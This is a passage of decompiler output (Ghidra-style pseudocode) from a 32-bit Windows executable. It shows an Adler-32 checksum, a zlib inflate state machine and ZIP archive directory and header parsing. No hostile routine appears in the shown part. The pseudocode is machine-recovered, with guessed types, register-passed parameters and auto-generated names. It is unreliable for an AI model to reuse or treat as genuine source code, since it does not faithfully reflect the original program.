          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_004068b0(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



undefined4 FUN_004068e0(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00406970(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00405b10();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_004069c0(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_004068b0;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(undefined **)(in_EAX + 0x24) = &LAB_004068d0;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_00405040(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x406770);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_004068e0();
      return 0;
    }
    FUN_00406970();
  }
  return 0xfffffffc;
}



int FUN_00406a70(void)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  byte **in_EAX;
  int iVar5;
  
  if (((in_EAX != (byte **)0x0) && ((uint *)in_EAX[7] != (uint *)0x0)) && (*in_EAX != (byte *)0x0))
  {
    iVar5 = -5;
    uVar2 = *(uint *)in_EAX[7];
    while (uVar2 < 0xe) {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        uVar3 = puVar4[1];
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if (((byte)uVar3 & 0xf) == 8) {
          if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
            *puVar4 = 1;
            goto switchD_00406aa6_caseD_1;
          }
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"invalid window size";
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"unknown compression method";
        }
        goto LAB_00406ca0;
      case 1:
switchD_00406aa6_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar4 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
          if ((bVar1 & 0x20) != 0) {
            *(undefined4 *)in_EAX[7] = 2;
            goto switchD_00406aa6_caseD_2;
          }
          *puVar4 = 7;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)"incorrect header check";
          *(undefined4 *)(in_EAX[7] + 4) = 5;
        }
        break;
      case 2:
switchD_00406aa6_caseD_2:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
      case 3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          iVar5 = 0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_00406aa6_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            iVar5 = 0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_00406aa6_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return 2;
            }
          }
        }
        return iVar5;
      case 4:
        goto switchD_00406aa6_caseD_4;
      case 5:
        goto switchD_00406aa6_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)"need dictionary";
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return -2;
      case 7:
        iVar5 = FUN_004050e0(*(void **)(in_EAX[7] + 0x14),iVar5);
        if (iVar5 == -3) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          iVar5 = -3;
        }
        else {
          if (iVar5 == 0) {
            return 0;
          }
          if (iVar5 != 1) {
            return iVar5;
          }
          iVar5 = 0;
          FUN_00404fd0();
          puVar4 = (undefined4 *)in_EAX[7];
          if (puVar4[3] == 0) {
            *puVar4 = 8;
            goto switchD_00406aa6_caseD_8;
          }
          *puVar4 = 0xc;
        }
        break;
      case 8:
switchD_00406aa6_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_00406aa6_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_00406aa6_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar4[1] == puVar4[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_00406aa6_caseD_c:
          return 1;
        }
        *puVar4 = 0xd;
        in_EAX[6] = (byte *)"incorrect data check";
LAB_00406ca0:
        iVar5 = 0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_00406aa6_caseD_a;
      case 0xb:
        goto switchD_00406aa6_caseD_b;
      case 0xc:
        goto switchD_00406aa6_caseD_c;
      case 0xd:
        return -3;
      }
      uVar2 = *(uint *)in_EAX[7];
    }
  }
  return -2;
}



uint __fastcall FUN_00406e10(undefined4 param_1,void *param_2,uint param_3)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint _Size;
  char *unaff_EDI;
  
  _Size = unaff_EBX * param_3;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 2),param_2,_Size,&param_3,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[6] = '\x01';
    }
    return param_3 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x14);
  if (*(uint *)(unaff_EDI + 0x10) < iVar1 + _Size) {
    _Size = *(uint *)(unaff_EDI + 0x10) - iVar1;
  }
  _memcpy(param_2,(void *)(*(int *)(unaff_EDI + 0xc) + iVar1),_Size);
  *(uint *)(unaff_EDI + 0x14) = *(int *)(unaff_EDI + 0x14) + _Size;
  return _Size / unaff_EBX;
}



undefined4 __cdecl FUN_00406e70(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  byte local_5;
  size_t local_4;
  
  _Size = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x14);
    if (*(uint *)(unaff_ESI + 0x10) < iVar1 + 1U) {
      _Size = *(uint *)(unaff_ESI + 0x10) - iVar1;
    }
    _memcpy(&local_5,(void *)(*(int *)(unaff_ESI + 0xc) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x14) = iVar1 + _Size;
    local_4 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 2),&local_5,1,&local_4,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[6] = '\x01';
    }
  }
  if (local_4 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[6] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_00406f00(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_4;
  
  iVar2 = FUN_00406e70(&local_4);
  uVar1 = local_4;
  if (iVar2 == 0) {
    iVar2 = FUN_00406e70(&local_4);
  }
  iVar4 = local_4 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00406e70(&local_4);
  }
  iVar3 = local_4 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_00406e70(&local_4);
    if (iVar2 == 0) {
      *unaff_EBX = local_4 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_00406f80(void)

{
  int iVar1;
  DWORD DVar2;
  void *_Dst;
  uint uVar3;
  BOOL BVar4;
  int iVar5;
  size_t _Size;
  char *unaff_ESI;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;
  int iStack_4;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x10);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 2),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    uStack_18 = *(uint *)(unaff_ESI + 0x14);
  }
  else if (unaff_ESI[1] == '\0') {
    uStack_18 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 2),0,(PLONG)0x0,1);
    uStack_18 = DVar2 - *(int *)(unaff_ESI + 7);
  }
  uStack_14 = 0xffff;
  if (uStack_18 < 0xffff) {
    uStack_14 = uStack_18;
  }
  _Dst = _malloc(0x404);
  if (_Dst == (void *)0x0) {
    return -1;
  }
  uStack_10 = 4;
  iStack_c = -1;
  if (uStack_14 < 5) {
LAB_00407131:
    _free(_Dst);
    return iStack_c;
  }
  do {
    uVar3 = uStack_10 + 0x400;
    uStack_10 = uStack_14;
    if (uVar3 <= uStack_14) {
      uStack_10 = uVar3;
    }
    iStack_4 = uStack_18 - uStack_10;
    uVar3 = uStack_18 - iStack_4;
    if (0x404 < uVar3) {
      uVar3 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x14) = iStack_4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_00407131;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 2),*(int *)(unaff_ESI + 7) + iStack_4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar5 = *(int *)(unaff_ESI + 0x14);
      _Size = uVar3;
      if (*(uint *)(unaff_ESI + 0x10) < iVar5 + uVar3) {
        _Size = *(uint *)(unaff_ESI + 0x10) - iVar5;
      }
      _memcpy(_Dst,(void *)(*(int *)(unaff_ESI + 0xc) + iVar5),_Size);
      *(size_t *)(unaff_ESI + 0x14) = *(int *)(unaff_ESI + 0x14) + _Size;
    }
    else {
      BVar4 = ReadFile(*(HANDLE *)(unaff_ESI + 2),_Dst,uVar3,&uStack_8,(LPOVERLAPPED)0x0);
      _Size = uStack_8;
      if (BVar4 == 0) {
        unaff_ESI[6] = '\x01';
      }
    }
    if (_Size / uVar3 != 1) goto LAB_00407131;
    iVar5 = uVar3 - 3;
    do {
      iVar1 = iVar5;
      if (iVar1 < 0) goto LAB_0040711c;
      iVar5 = iVar1 + -1;
    } while ((((*(char *)(iVar5 + (int)_Dst) != 'P') || (*(char *)(iVar1 + (int)_Dst) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)_Dst) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)_Dst) != '\x06'));
    iStack_c = iVar5 + iStack_4;
LAB_0040711c:
    if ((iStack_c != 0) || (uStack_14 <= uStack_10)) goto LAB_00407131;
  } while( true );
}



int * FUN_00407150(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int *piVar8;
  uint uStack_94;
  int local_90;
  int local_8c;
  int local_88;
  int aiStack_84 [7];
  int iStack_68;
  int iStack_64;
  int iStack_60;
  undefined4 uStack_8;
  
  if (in_EAX == (char *)0x0) {
    return (int *)0x0;
  }
  local_90 = 0;
  local_88 = FUN_00406f80();
  if (local_88 == -1) {
    local_90 = -1;
  }
  if (*in_EAX == '\0') {
    *(int *)(in_EAX + 0x14) = local_88;
  }
  else if (in_EAX[1] == '\0') {
    local_90 = -1;
  }
  else {
    SetFilePointer(*(HANDLE *)(in_EAX + 2),*(int *)(in_EAX + 7) + local_88,(PLONG)0x0,0);
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00406e70(&uStack_94);
  uVar1 = uStack_94;
  iVar6 = 0;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&uStack_94), iVar2 == 0)) {
    local_8c = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_8c = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = FUN_00406e70(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&uStack_94), iVar2 == 0)) {
    iVar6 = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_90 = -1;
  }
  iVar2 = FUN_00406e70(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&uStack_94), iVar2 == 0)) {
    aiStack_84[1] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[1] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = aiStack_84[1];
  iVar3 = FUN_00406e70(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar3 == 0) && (iVar3 = FUN_00406e70(&uStack_94), iVar3 == 0)) {
    iVar5 = uStack_94 * 0x100 + uVar1;
  }
  else {
    iVar5 = 0;
    if (iVar3 != 0) {
      local_90 = -1;
    }
  }
  if (((iVar5 != iVar2) || (iVar6 != 0)) || (local_8c != 0)) {
    local_90 = -0x67;
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00406e70(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&uStack_94), iVar2 == 0)) {
    aiStack_84[2] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[2] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  if (((uint)(iStack_64 + iStack_60) <= (uint)(*(int *)(in_EAX + 7) + local_88)) && (local_90 == 0))
  {
    aiStack_84[3] = ((*(int *)(in_EAX + 7) - iStack_64) - iStack_60) + local_88;
    iStack_68 = local_88;
    uStack_8 = 0;
    *(undefined4 *)(in_EAX + 7) = 0;
    piVar4 = (int *)_malloc(0x80);
    piVar7 = aiStack_84;
    piVar8 = piVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *piVar8 = *piVar7;
      piVar7 = piVar7 + 1;
      piVar8 = piVar8 + 1;
    }
    FUN_00407830();
    return piVar4;
  }
  if (in_EAX[0xb] != '\0') {
    CloseHandle(*(HANDLE *)(in_EAX + 2));
  }
  FUN_0040fb79(in_EAX);
  return (int *)0x0;
}



int __cdecl FUN_004073e0(int *param_1,uint *param_2,void *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c;
  uint local_58;
  int aiStack_54 [4];
  uint uStack_44;
  uint uStack_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  int iStack_24;
  int iStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  int iStack_8;
  
  local_5c = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x14) = in_EAX[5] + (int)in_EAX[3];
  }
  else {
    if (pcVar1[1] == '\0') {
      local_5c = -1;
      goto LAB_0040745f;
    }
    SetFilePointer(*(HANDLE *)(pcVar1 + 2),(LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 7))
                   ,(PLONG)0x0,0);
  }
  iVar2 = FUN_00406f00();
  if (iVar2 == 0) {
    if (local_58 != 0x2014b50) {
      local_5c = -0x67;
    }
  }
  else {
    local_5c = -1;
  }
LAB_0040745f:
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    aiStack_54[0] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[0] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    aiStack_54[1] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[1] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    aiStack_54[2] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[2] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    aiStack_54[3] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[3] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  uStack_10 = uStack_44 >> 0x10 & 0x1f;
  iStack_8 = (uStack_44 >> 0x19) + 0x7bc;
  iStack_c = (uStack_44 >> 0x15 & 0xf) - 1;
  uStack_14 = uStack_44 >> 0xb & 0x1f;
  uStack_18 = uStack_44 >> 5 & 0x3f;
  iStack_1c = (uStack_44 & 0x1f) * 2;
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00406e70(&local_58);
  uStack_34 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    uStack_34 = local_58 * 0x100 + uStack_34;
  }
  else {
    uStack_34 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    iStack_30 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_30 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    iStack_2c = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_2c = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    iStack_28 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_28 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406e70(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00406e70(&local_58), iVar2 == 0)) {
    iStack_24 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_24 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00406f00();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_5c == 0) {
    if (param_3 != (void *)0x0) {
      if (uStack_34 < param_4) {
        *(undefined *)(uStack_34 + (int)param_3) = 0;
      }
      if (((uStack_34 != 0) && (param_4 != 0)) &&
         (uVar3 = FUN_00406e10(param_4,param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = aiStack_54;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_58;
    }
  }
  return local_5c;
}



int FUN_00407830(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_004073e0((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_00407870(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char **unaff_EDI;
  char *pcStack_8;
  char *local_4;
  
  iVar6 = 0;
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x14) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 2),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 7)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_00406f00();
  if (iVar4 == 0) {
    if (local_4 != (char *)0x4034b50) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00406e70((uint *)&local_4);
  if (iVar4 == 0) {
    iVar4 = FUN_00406e70((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00407903;
  }
  else {
LAB_00407903:
    iVar6 = -1;
  }
  iVar4 = FUN_00406e70((uint *)&local_4);
  pcVar5 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00406e70((uint *)&local_4);
    if (iVar4 != 0) goto LAB_0040793d;
    local_4 = pcVar5 + (int)local_4 * 0x100;
  }
  else {
LAB_0040793d:
    local_4 = (char *)0x0;
    if (iVar4 != 0) {
      iVar6 = -1;
    }
  }
  iVar4 = FUN_00406e70((uint *)&pcStack_8);
  pcVar5 = pcStack_8;
  if (iVar4 == 0) {
    iVar4 = FUN_00406e70((uint *)&pcStack_8);
    if (iVar4 != 0) goto LAB_004079c0;
    pcStack_8 = pcVar5 + (int)pcStack_8 * 0x100;
LAB_00407981:
    if ((iVar6 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], pcStack_8 != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_004079c0:
    pcStack_8 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00407981;
    iVar6 = -1;
  }
  iVar4 = FUN_00406f00();
  if (iVar4 != 0) {
    iVar6 = -1;
  }
  iVar4 = FUN_00406f00();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0xf])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00406f00();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x10])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00406f00();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x11])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00406e70((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00406e70((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00407ac6;
    pcVar5 = pcStack_8 + (int)local_4 * 0x100;
LAB_00407a79:
    if ((iVar6 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00407ac6:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00407a79;
    iVar6 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
